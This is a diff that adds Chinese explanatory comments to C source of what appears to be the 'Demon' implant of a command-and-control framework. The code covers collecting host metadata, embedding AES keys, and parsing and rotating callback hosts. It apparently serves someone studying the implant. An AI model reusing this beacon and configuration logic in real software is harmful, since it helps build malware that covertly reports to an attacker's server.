@@ -18,7 +18,7 @@
 
 /* Global Variables */
 SEC_DATA INSTANCE Instance      = { 0 };
-SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
+SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES; // 从编译选项CONFIG_BYTES中获取的Profile信息
 
 /*
  * In DemonMain it should go as followed:
@@ -77,6 +77,7 @@ VOID DemonRoutine()
 
 #ifdef TRANSPORT_HTTP
                 /* reset the failure counter since we managed to connect to it. */
+                // 连接成功一次，就将失败次数置0
                 Instance.Config.Transport.Host->Failures = 0;
 #endif
             }
@@ -94,6 +95,7 @@ VOID DemonRoutine()
 }
 
 /* Init metadata buffer/package. */
+// 收集机器信息，并构造Demon的MetaData结构体
 VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 {
     PVOID            Data       = NULL;
@@ -152,6 +154,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
     */
 
+    // 添加MetaData信息
     // Add AES Keys/IV
     PackageAddPad( *MetaData, Instance.Config.AES.Key, 32 );
     PackageAddPad( *MetaData, Instance.Config.AES.IV,  16 );
@@ -813,6 +816,7 @@ VOID DemonInit( VOID )
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
 }
 
+// 解析Profile并设置
 VOID DemonConfig()
 {
     PARSER Parser = { 0 };
@@ -868,30 +872,32 @@ VOID DemonConfig()
 
 #ifdef TRANSPORT_HTTP
     Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
-    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
+    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser ); // 轮询的方式
     Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                     * TODO: add this to the yaotl language and listener GUI */
     Instance.Config.Transport.Hosts          = NULL;
     Instance.Config.Transport.Host           = NULL;
 
     /* J contains our Hosts counter */
-    J = ParserGetInt32( &Parser );
+    J = ParserGetInt32( &Parser ); // Hosts的数量
     PRINTF( "[CONFIG] Hosts [%d]:", J )
     for ( INT i = 0; i < J; i++ )
     {
-        Buffer = ParserGetBytes( &Parser, &Length );
-        Temp   = ParserGetInt32( &Parser );
+        Buffer = ParserGetBytes( &Parser, &Length ); // host
+        Temp   = ParserGetInt32( &Parser ); // port
 
         PRINTF( " - %ls:%ld\n", Buffer, Temp )
 
         /* if our host address is longer than 0 then lets use it. */
         if ( Length > 0 )
             /* Add parse host data to our linked list */
+            // 添加到Instance.Config.Transport.Hosts链表中
             HostAdd( Buffer, Length, Temp );
     }
     PRINTF( "Hosts added => %d\n", HostCount() )
 
     /* Get Host data based on our host rotation strategy */
+    // 根据轮询的方式获取后续遍历的Host链表
     Instance.Config.Transport.Host = HostRotation( Instance.Config.Transport.HostRotation );
     PRINTF( "Host going to be used is => %ls:%ld\n", Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port )
 
@@ -919,6 +925,7 @@ VOID DemonConfig()
         printf( "  - %ls\n", Instance.Config.Transport.Headers[ i ] );
 #endif
     }
+    // 以NULL作为结束标志
     Instance.Config.Transport.Headers[ J + 1 ] = NULL;
 
     // Uris
